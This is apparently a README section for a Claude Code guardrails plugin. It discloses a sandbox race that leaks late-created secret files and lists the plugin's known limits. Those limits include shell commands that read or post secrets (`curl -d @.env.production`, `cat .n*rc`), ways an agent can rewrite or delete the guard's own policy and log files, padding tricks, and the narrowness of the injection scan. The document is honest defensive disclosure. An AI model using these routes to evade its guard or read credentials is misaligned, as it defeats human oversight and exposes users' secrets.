- A secret file created while a shell command is already running can be read by that command: Claude Code (2.1.319, Linux) turns each sandbox `denyRead` pattern into the list of matching files when each command starts, and the next command hides the new file. A file pattern (`.env*`, `.npmrc`) leaks when the file is late. A folder pattern (`~/.aws`) still hides a late file inside a folder that existed at the start, but leaks when the folder itself is made late. No setting re-scans; the fix is in Claude Code (tested 4 of 4 each way).

Stronger options, not shipped: `sandbox.credentials.envVars` deny entries (hide named environment variables; each variable must be named), `permissions.blockReadsOutsideWorkingDirectories` (closes the folder-outside-the-project row; breaks tools that read home config such as `~/.cargo`), and an admin-required sandbox in managed settings (`allowUnsandboxedCommands: false` there makes Claude Code ignore repository settings that loosen it).

### Tested on

The probe sessions behind this layer ran on Claude Code 2.1.318 (2026-11-05) and `tests/live/t014_probe.py` on 2.1.319 (2026-11-06), on Linux, with fake secrets and the plugin loaded with `--plugin-dir`. Run `python3 tests/live/t014_probe.py` (it needs the `claude` CLI signed in; it starts several short `claude -p` sessions, which cost a few cents) after you upgrade Claude Code: the block relies on behaviour seen on those versions (`./` anchoring, the Linux wildcard rule, `failIfUnavailable`), and the plugin does not check the version. On a host with the Ubuntu restriction and no profile, the script shows the exact block refusing every shell command, then uses a probe-only override (`network.allowAllUnixSockets` in a `--settings` file, which skips the seccomp step) to show the masks. The shipped block never sets that override, and Pre denies a shell call when a project settings file sets it. PowerShell and Monitor are sandboxed per the Claude Code docs; they were not run.

## What this does not do

T-006 to T-009 below are work-item ids from the project's own tracker (they are not in this repo). T-006 (command spellings and missing commands), T-007 (the guard protects itself), T-008 (secrets named in any field) and T-009 (the injection scan) are built. "Fix not built yet" means a fix is written down in the tracker and is not built.

- **No spend cap.** It counts calls, not money. Use your provider's limits for spend.
- **The step cap is soft.** Parallel calls can share a step number. If Claude Code sends no session id (or a JSON `null` one), every such call shares one counter file (`state/unknown.calls`, or `state/None.calls`), so the cap counts every call that uses this plugin's data folder, across all sessions and days. Delete that file to reset it.
- **It only sees tool calls.** It does not stop the model from saying things. It does not protect against attacks from outside Claude Code (a malicious package you install yourself, a script the agent writes and runs; limit 3 in [THREAT_MODEL](docs/THREAT_MODEL.md)). Use a container or a separate user for those.
- **The injection scan is a log record, not a shield.** A web page, a downloaded file or a subagent's answer can still talk to the model. The plugin scans the output of every tool you have not trusted, failed calls too, and writes a warning in the log (you see nothing in the Claude Code window); it does not stop the model reading the text. It knows six phrases, so other wording, other languages, encodings and images pass (limit 2 in [THREAT_MODEL](docs/THREAT_MODEL.md)). To limit what an injected order can reach, run the agent in a container or as a separate user with no access to your secrets.
- **Pattern rules can be bypassed** by a crafted command (an encoded string, a script that reads the file). They stop the listed commands and file names in the listed spellings, not a determined attacker. For hard isolation use a container or a separate user (limit 4 in [THREAT_MODEL](docs/THREAT_MODEL.md)).
- **The agent can still change the guard from the shell (limit 7 in [THREAT_MODEL](docs/THREAT_MODEL.md)).** The write tools are denied on the guard's files, and an added policy file can only add rules (`trusted_tools` aside). A Bash command can still write a file in many ways (a redirect, `sed -i`, `python3 -c`, a path in a variable, a relative path after `cd`), so matching on the command text can never catch all of them, and the plugin does not try. Only a command that names a guard path as an absolute or `~` path asks. Such a write can rewrite the shipped policy, the hook scripts or `vendor/`, delete an added policy file or the step counter, edit the log, or add a slow regex. Examples that are allowed: `rm "$CLAUDE_PLUGIN_DATA"/state/s.calls`, `cd ~/.claude/plugins/data && rm agent-guardrails/policy.json`, a guard path with a space, a quote or a backslash in it (the command is split into words there), a glob such as `~/.claude/plugins/data/*/policy.json`, and a parent folder such as `mv ~/.claude/plugins/data /tmp/x`. The barrier meant for these writes is Claude Code's own Bash sandbox with unsandboxed commands switched off (`sandbox.enabled` true and `sandbox.allowUnsandboxedCommands` false; per the Claude Code docs, Claude Code then ignores `dangerouslyDisableSandbox`), plus `permissions.deny` rules such as `Edit(//path/to/plugin/**)` for the plugin folder and the data folder. **Not tested here.** The sandbox limits writes to the working folder, so it does not cover a plugin folder inside the project; install the plugin outside the project. Also not covered: Python start-up files in an activated virtualenv inside the project (limit 7), and a repository's own Claude Code settings beyond the `ask-claude-settings` check.
- **Nothing controls what leaves the machine.** `curl`, `wget` and WebFetch can send anything the agent has read (limit 8 in [THREAT_MODEL](docs/THREAT_MODEL.md)).
- **Secrets are protected by name, not by content.** The rules deny the listed files and folders (`.env` files, keys, `~/.aws`, `~/.ssh`, `~/.config/gcloud`, `.netrc`, `.git-credentials`, `.npmrc`, `.pypirc`) named in any field of a file or MCP tool call, and ask when a word of a shell command names one. They do not stop `grep -r AWS_SECRET ~`, a content search with the Grep tool, `printenv`, or the shell forms listed in "Gaps in the rules" in [THREAT_MODEL](docs/THREAT_MODEL.md), secrets (`cd ~/.config/gh && cat hosts.yml`, `cat .n*rc`, `curl -d @.env.production`). The opt-in isolation layer ("Isolation (opt-in)" above) blocks the shell forms among those for the listed files; what it leaves is listed there: environment variables, the Grep tool and MCP tools, old copies in git, and files outside the project and outside `~` and `~/.config`. With isolation off, use a container or a separate user with no access to the secrets (limit 4).
- **Rules match the command text.** Option words before the subcommand are seen (`git -C repo push --force` asks), up to 8 of them. Quoted or hidden spellings are not: `"rm" -r x` and `git "push" -f` are allowed, `git push "-f"` and `bash -c "git push -f"` ask under the plain push rule, and `vercel` with `--prod` on the next line is allowed. `rm -f`, `kubectl patch`, `docker buildx build --push` and a script that deletes files have no rule. Command rules and the word-by-word file-name check read only the tool named `Bash` (`cat .env` sent through PowerShell or Monitor asks, because the whole command string ends in a listed name and those two are matched as one string, not word by word; through another tool name it is matched whole against the path rules and denied; the same command ending in `.env.local` is allowed). The limits are listed once in "Gaps in the rules" in [THREAT_MODEL](docs/THREAT_MODEL.md) (T-006 in the project's tracker). For other tool names no fix is written down.
- **An MCP tool name that starts with a reading word can hide a money-moving word.** The MCP rule excuses a name that starts with a reading word (`get`, `list`, `find`, `search`, `fetch`...) followed directly by a write word, and it then excuses every later write word in the name too. `mcp__x__get_payment_then_transfer` and `mcp__x__list_payments_and_charge` are allowed, although they move money. The rule does not ask on them.
- **Bypass mode.** In interactive bypass mode a hook's ask still stopped the command and showed a prompt (tested 2026-11-06 on Claude Code 2.1.319; see the mode table in "What holds each threat"). So a shell read of a listed secret is held by the answer of the person at the keyboard, and by isolation. Nobody is asked in `claude -p`, where the call is refused. The test used one stub hook and one harmless command; a Claude Code upgrade can change it. This plugin can turn a deny into an ask (a command padded past 20000 characters; limit 5 in [THREAT_MODEL](docs/THREAT_MODEL.md)), and the person can then answer yes. Put what must never run in Claude Code's own `permissions.deny` too (check its release notes first; see "How this relates to Claude Code's own controls" in [ARCHITECTURE](docs/ARCHITECTURE.md)).
- **Over-matching.** The `deny-prod-config` patterns `*/prod/*` and `*/production/*` match a path, absolute, `~` or relative, with a `prod` or `production` folder below the project folder, or outside the project (a file tool is denied, a shell command asks). A project that itself sits in or behind such a folder is not affected: its own files are matched below the project folder. A relative path that leaves the project and spells no `prod` folder (`../other/x`) is not caught, as before. For Bash, every word of the command is treated as a possible path, so `git commit -m "fix production/config"` asks (rule `deny-prod-config`). Other false positives are listed in "Known false positives" in [THREAT_MODEL](docs/THREAT_MODEL.md) (for example `echo .env >> .gitignore` asks; adding `.env` to `.gitignore` with the Edit or Write tool is allowed). The MCP write rule is a name pattern and may ask for harmless tools (`mcp__x__postal_lookup`, `mcp__x__payment_status` and `mcp__x__get_user_payments` ask; the server name does not count, so `mcp__my_sender__list` is allowed); `except` does not work on it (see "Change the rules"), so narrow its `match` pattern.
- **Needs Claude Code 2.1.295 or later for the hard fail-safe.** Older versions have no `onFailure` setting (it was added in 2.1.295, per the release notes; not tested here), so a hook that cannot start or times out lets the call through. Not tested: whether an older version ignores the unknown key or rejects the hook entry, which would turn the guard off there. The plugin also needs `python3` on PATH. Without it, 2.1.295 and later should block every call; older versions allow them.
- **You cannot loosen a shipped rule from your own policy file.** A user who copied the shipped file and changed a deny to an ask keeps getting the deny. A switch kept in a file the agent can write is a switch the agent can flip. Edit the shipped file by hand if you must (a plugin update undoes the edit).
- **Long commands ask.** A Bash command over 20000 characters is not checked by the rules. It always gets **ask** (rule `oversize-command`), even if it holds a deny pattern.
- **Logs are partial.** If you decline an ask, only the `decision` line exists. Allowed calls that never ran are not logged. If the Post script fails (a broken shipped policy or an unset data folder also break it), a call that ran leaves no result line. A call that failed is sent by Claude Code to a separate event, PostToolUseFailure; the plugin registers the Post script for it too, so it gets a result line with status `error`. Without a `tool_use_id`, a result line can show another call's decision. An ask caused by an internal error (`guardrails-error`) is logged like any other decision when the data folder can be written; when it cannot, there is no line, and if you approve the call the result line shows decision `unknown`. If the decision memo cannot be written, the log line of a deny or ask is lost too. State files in `state/` are not cleaned up, and Pre reads the whole counter file on every call, so a shared file that is never deleted makes every call do more work (not measured). The write tools are denied on the log, but a Bash command can still edit it (limit 7 in [THREAT_MODEL](docs/THREAT_MODEL.md)). A secret in a format redaction does not know is written to the log as it is, so do not rely on redaction alone.

## Develop

```bash
make lint     # ruff
make test     # unit + end-to-end + acceptance tests (`uv run pytest`); runs make build first
make demo     # the table above
make build    # delete vendor/guardrails_core and re-copy core's *.py files into it
```

Needs [uv](https://docs.astral.sh/uv/) for `make lint` and `make test`. "Core" is `packages/guardrails-core`, the engine. "Vendor" is its copy in `packages/guardrails-plugin/vendor/`. `make test` includes the doc tests, so an edit to README, GLOSSARY or docs/ can fail it. Run `make build` after you edit core, commit the result, and run `git status` to add any new file under `vendor/`. A direct `uv run pytest` fails if the copy drifts; `make test` rebuilds the copy first, so it cannot catch this. CI runs `make build` and fails if the status of `packages/guardrails-plugin/vendor` shows any change, a new file git does not track yet included.

More: [ARCHITECTURE](docs/ARCHITECTURE.md) · [THREAT_MODEL](docs/THREAT_MODEL.md) · [GLOSSARY](GLOSSARY.md)

License: [MIT](LICENSE).
